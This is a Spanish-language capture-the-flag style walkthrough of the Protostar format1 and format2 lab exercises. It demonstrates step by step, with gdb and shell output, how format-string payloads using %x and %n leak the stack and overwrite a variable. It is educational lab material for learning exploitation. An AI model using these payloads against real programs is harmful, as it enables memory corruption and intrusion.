
---------------------------------------------------------------------------
## Sobreescribir una variable -> [format1](https://exploit.education/protostar/format-one/)

Este binario toma un argumento (al que llama "string"), lo mete en la funcion **printf()** y te imprime dicho argumento

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 AAA
AAA[user@protostar]-[/opt/protostar/bin]:$ 
```
 Como no hace un salto de linea, lo ponemos nosotros concatenando "; echo"
  
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 AAA; echo
AAA
[user@protostar]-[/opt/protostar/bin]:$ 
```
 ¿Si en vez de pasarle una "A" le pasamos una cadena de formateo como %x (numero hexadecimal)?
  
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 %x; echo
804960c
[user@protostar]-[/opt/protostar/bin]:$ ./format1 "%x %x"; echo
804960c bffff6e8
```
 Este "bffff6e8" parece una direccion de la pila... Vamos a mirar en gdb, poniendo un breakpoint en una funcion cuaqluiera (prinff())
 para ver como es la pila con datos.
 
```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('%x'*4)"  > /tmp/pattern
[user@protostar]-[/opt/protostar/bin]:$ gdb ./format1
(gdb) disas vuln
0x080483f4 <vuln+0>:	push   %ebp
...
0x080483fd <vuln+9>:	mov    %eax,(%esp)
0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
...
0x0804841a <vuln+38>:	leave  
0x0804841b <vuln+39>:	ret    
(gdb) b *0x08048400
(gdb) run < /tmp/pattern
Starting program: /opt/protostar/bin/format1 < /tmp/pattern
Breakpoint 4, 0x08048400 in vuln (string=0x0) at format1/format1.c:10
(gdb) x/8wx $esp
0xbffff670:	0x00000000	0x0804960c	0xbffff6a8	0x08048469
0xbffff680:	0xb7fd8304	0xb7fd7ff4	0xbffff6a8	0x08048435	
```
    
Como podemos ver la segunda entrada de la pila es nuestro "0x0804960c" que se imprimió antes, es decir, prinf(%x) imprime contenido de la pila.

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'BBBB'+'%8x.'*150 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
3174616d
41414100
42424241
7838252e
7838252e
```
   Nos está imrpimiendo muchos valores de la pila, en cierto momento, se ven "41" y "42", que equivalen a nuestras "A" y "B", seguidos de "7838252e"
   que son nuestras "%8x.". El objetivo, esque sean las A los útlimos valores que salgan, para eso hay que reducir las x u offset.
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'BBBB'+'%8x.'*138 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
726f662f
3174616d
41414100
42424241
```
   El problema esque se han mezclado los 42 y los 41 (A)s y (B)s, y tiene que quedar perfecto, asi que se reduce el numero de "B"

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'B'+'%8x.'*138 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
41414141
78382542
7838252e
7838252e
7838252e
```
  Se quitan mas "x"

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'B'+'%8x.'*168 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
2f2e0000
6d726f66
317461
41414141
```
  Perfecto, ya están alineados nuestras, "A". Pero ahora lo que interesa es cambiar esas "A" por otra cosa, la direccion de la varaible 
  que queremos modificar:
```console
[user@protostar]-[/opt/protostar/bin]:$ objdump -t ./format1 | grep "target"
08049638 g     O .bss	00000004              target
```
  La direccion de la variable "target" es *0x08049638* que si lo pasamos a endian (dar la vuelta a los bytes) sale -> *\x38\x96\x04\x08*
  Ahora sustituimos las "AAAA" por esa dirección (ambas cosas ocupan 4 bytes).
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
317461
8049638
```
  Perfecto, la dirección de memoria se ha alineado perfectamente. Ahora hay que sobrrescribirla cambiando la "%x" por "%n"
  
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%n')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
317461
you have modified the target :)
```
  Y ya está, primer format completado.
  
  **Entonces. ¿Que hemos hecho con todo esto?** Primero hemos observado el binario, la pila... Hemos visto que nos imprimía valores de esta al pasarle
  "%x" y que a cierto numero de estos, se muestra nuestro input. 
  Hemos sustituido un input random "AAAA" por la direccion de una varaible (target = \x38\x96\x04\x08)
  La hemos colocado al final y hemos escrito en ella con "%n". 
  Es decir gracias a "%n" podemos escribir dentro de una direccion de memoria que pongamos en la pila. (gracias a que esta actua como puntero).
  
  **¿Que hemos escrito en la varaible target?** La "B"
  
  **Y si en vez de una direccion de memoria válida hubieramos metido las "AAAA"?** Que %n diria de escribir en una memoria que no existe en (0x41414141)
  no hay nada. Entonces arrojaría un segmentation fault.
  
  **A nivel de código que hemos hecho?** Exactamente esto ->  ```printf("AAAA%n", &variable) -> varaible = "AAAA"```
  
    ---------------------------------------------------------------------------
## Escribir un número de bytes en una variable -> [format2](https://exploit.education/protostar/format-two/)

Format2 no nos pide un argumento sino un input una vez ejecutado, la manera de pasarle dichi input por tanto cambia
  
```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%8x."*5)' | ./format2
AAAA     200.b7fd8420.bffff524.41414141.2e783825.
target is 0 :(
```
A diferencia del caso anterior, el offset es mucho menor, es decir nos imprime nuestro input de AAAA mucho antes.
Si seguimos lo que hemos aprendido del primer format daremos con la conclusión de que la cuarta direccion que nos imprime (donde empiezan 
las AAAA) es donde poner nuestra direccion de memoria y con la que escribir las "B" gracias al paráemtro "%n".

Vamos a ver la dirección de la memoria que tenemos que sobreescribir
```console
[user@protostar]-[/opt/protostar/bin]:$ objdump -t ./format2 | grep "target"
080496e4 g     O .bss	00000004              target
```
O sea: *\xe4\x96\x04\x08*

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B"+ "%8x."*3 + "%x")' | ./format2
B     200.b7fd8420.bffff524.80496e4
target is 0 :(
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B"+ "%8x."*3 + "%n")' | ./format2
B     200.b7fd8420.bffff524.
target is 32 :(
```
Hemos conseguido escribir en la variable. Pero ahora os introduciré dos comandos interesantes que nos abreviarán las cosas.
> **"%4$n"** es escribe en el cuarto argumento (la cuarta dirección), lo que equivale a nuestro *"%8x."*3 + "%n"* de antes

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B" + "%4$n")' | ./format2
B
target is 5 :(
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "%4$n")' | ./format2
�
target is 4 :(
```
Es decir, de por sí escribe 4 bytes (5 si le metemos la "B"). Pero el ejecicio dice que nos tiene que salir "target = 64" O sea escribir 64 bytes.
Si a 64 le restamos los 4 bytes, nos da 60, así que hay que meter 60 bytes.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B"*60 + "%4$n")' | ./format2
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
you have modified the target :)
```
Esto tambíen se puede poner de otra forma, que es así:
> **"%60d%4$n"**  escribe en el cuarto argumento 60 dígitos.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "%60d%4$n")' | ./format2
                                                         512
you have modified the target :)
```
    ---------------------------------------------------------------------------
## Escribir un valor hexadecimal en una variable -> [format3](https://exploit.education/protostar/format-three/)


